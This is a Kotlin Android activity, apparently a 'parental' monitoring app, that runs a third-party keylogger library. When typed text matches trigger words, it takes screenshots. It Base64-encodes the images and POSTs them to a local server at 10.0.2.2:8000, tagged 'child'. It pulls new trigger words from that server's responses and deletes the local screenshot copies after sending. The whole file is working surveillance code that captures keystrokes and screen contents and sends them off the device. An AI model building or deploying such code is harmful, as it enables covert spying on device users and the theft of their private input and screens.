package com.example.thirdtry

import android.app.ActivityManager
import android.content.Context
import android.graphics.Bitmap
import android.graphics.Canvas
import android.os.Bundle
import android.os.Environment
import android.util.Base64
import android.view.View
import android.widget.Button
import android.widget.ImageView
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.android.volley.AuthFailureError
import com.android.volley.Request
import com.android.volley.Response
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import com.evilthreads.keylogger.Keylogger
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONException
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.lang.reflect.Method
import java.util.Calendar


//val mainScope = MainScope() // Create a MainScope
//val customScope = CoroutineScope(Dispatchers.Default) // Create a custom scope with Default dispatcher

class MainActivity : AppCompatActivity() {


    override fun onCreate(savedInstanceState: Bundle?) {

        // setting the view
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

//        main = findViewById(R.id.container)

        // getting screen elements
        val btn: Button = findViewById(R.id.button)
        val prem: Button = findViewById(R.id.premission)
        val image: ImageView = findViewById(R.id.imageView)
        val main : View = findViewById(R.id.container)


        // on button clicked
        btn.setOnClickListener {
        }


        // when user clicked on the permission button
        prem.setOnClickListener {


            // requset the keylogger permission
            Keylogger.requestPermission(this)

            // running keylogger in lifecycleScope (Coroutine)
            lifecycleScope.launch {
                // Coroutine code here
                delay(1000)



                // adding a default pattern so the keylogger doesn't always send screenshot to server
                // with every keyboard click
                Keylogger.addPattern("badword")


                // when the pattern matched...
                Keylogger.subscribe { entry ->


                    var file : File? = buttonScreenShot(main)


                    // print the log in logcat
                    println("KEYLOGGER OUTPUT:" + entry.text)


                    var json = JSONObject()


                    // filling the 'from' in json var
                    json.put("from", "child")

                    // making another json var for images
                    var images = JSONObject()


                    // reading every screenshot saved in Android/data/com.example.ThirdTry/files/Pictures
                    // These files were not sent to the server so we stored them to send them with the next keylogger catch
                    val documentsDirectory = getExternalFilesDir(Environment.DIRECTORY_PICTURES)
                    documentsDirectory?.let { directory ->
                        if (directory.exists() && directory.isDirectory) {
                            val imageFiles = directory.listFiles { file ->
                                file.extension.equals("jpg", ignoreCase = true) || file.extension.equals(
                                    "jpeg",
                                    ignoreCase = true
                                ) || file.extension.equals("png", ignoreCase = true)
                            }
                            imageFiles?.forEach { imageFile ->
                                // Do something with each image file, like displaying or processing it

                                // encoding the image and puting it in the images json var
                                images.put(imageFile.name, encodeImageToBase64(imageFile))
                            }
                        }
                    }


                    // checking server status
                    var online : Boolean = true


                    // sending a request to check if server is offline
                    val jsonRequest1 = object : JsonObjectRequest(
                        Request.Method.POST, "http://10.0.2.2:8000/online", json,

                        Response.Listener { response ->
                            try {


                                // if server is offline, do not send the images
                                if (response.toString().contains("false")){
                                    println("SERVER IS OFFLINE")
                                    online = false
                                }
                                println("RESPONSE " + response.toString())

                            } catch (e: JSONException) {
                                e.printStackTrace()


                                // if server did not respond, assume that server is offline
                                online = false
                                println("ERROR: " + e.toString())
                            }

                        },

                        Response.ErrorListener { error ->

                            println("ERROR: " + error.toString())

                        }) {
                        @Throws(AuthFailureError::class)
                        override fun getBodyContentType(): String {
                            return "application/json"
                        }

                        override fun getHeaders(): Map<String, String> {
                            val apiHeader = HashMap<String, String>()
//                    apiHeader["Authorization"] = "Bearer "
                            return apiHeader
                        }

                    }

                    val queue1 = Volley.newRequestQueue(this@MainActivity)
                    queue1.add(jsonRequest1)





                    // sending images if server is online
                    if (online) {

                        /// log
                        println("SENDIG IMAGES TO SERVER")
                        json.put("images", images)
                        // puting the json image var to the json var

                        // sending json var
                        val jsonRequest = object : JsonObjectRequest(
                            Request.Method.POST, "http://10.0.2.2:8000/child", json,

                            Response.Listener { response ->


                                // get the response from the server, the updated words are in the respnse
                                // so add the words in keylogger pattern
                                var wordsstring = response.getString("words")
                                var words = wordsstring.split('\n')
                                words.forEach {
                                    word ->
                                    Keylogger.addPattern(word)
                                    println("WORD ADDED: " + word)
                                }
                                try {
                                    println("RESPONSE " + response.toString())

                                } catch (e: JSONException) {
                                    e.printStackTrace()
                                    println("ERROR: " + e.toString())
                                }

                            },

                            Response.ErrorListener { error ->

                                println("ERROR: " + error.toString())

                            }) {
                            @Throws(AuthFailureError::class)
                            override fun getBodyContentType(): String {
                                return "application/json"
                            }

                            override fun getHeaders(): Map<String, String> {
                                val apiHeader = HashMap<String, String>()
//                    apiHeader["Authorization"] = "Bearer "
                                return apiHeader
                            }

                        }


                        val queue = Volley.newRequestQueue(this@MainActivity)
                        queue.add(jsonRequest)



                        // now all of the screenshots have been sent to server, we cen delete all of them
                        // and prepare for the next screenshot

                        // deleting all of the screenshots
                        val picturesDirectory =
                            File(getExternalFilesDir(Environment.DIRECTORY_PICTURES).toString())
                        picturesDirectory.listFiles()?.forEach { file ->
                            file.delete()
                        }


                        // creating a temp file to keep the directory and avoid exceptions
                        val picturesDir = getExternalFilesDir(Environment.DIRECTORY_PICTURES)
                        File.createTempFile("prefix", ".tmp", picturesDir)

                    }
                }
            }
        }
    }




    // fun for screenshot
    fun buttonScreenShot(view: View): File? {

        // get the view and bitmap
        val view1: View = view.rootView
        val bitmap: Bitmap = Bitmap.createBitmap(view1.width, view1.height, Bitmap.Config.ARGB_8888)
        val canvas = Canvas(bitmap)
        view1.draw(canvas)

        // save the screenshot
        val name: String = Calendar.getInstance().time.toString().replace(' ', '-') + ".jpg"
        val fileScreenshot = File(
            getExternalFilesDir(Environment.DIRECTORY_PICTURES),
            name
        )

        try {
            val fileOutputStream = FileOutputStream(fileScreenshot)
            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, fileOutputStream)
            fileOutputStream.flush()
            fileOutputStream.close()
            println("SAVED")
            return fileScreenshot
        } catch (e: Exception) {
            println("FAILED TO SAVE")
            return null
        }
    }
}


// fun fore encoding images in base64
fun encodeImageToBase64(file: File): String {
    val fileInputStream = FileInputStream(file)
    val bytes = ByteArray(file.length().toInt())
    fileInputStream.read(bytes)
    fileInputStream.close()
    val encodedString = Base64.encodeToString(bytes, Base64.DEFAULT)
    return encodedString
}
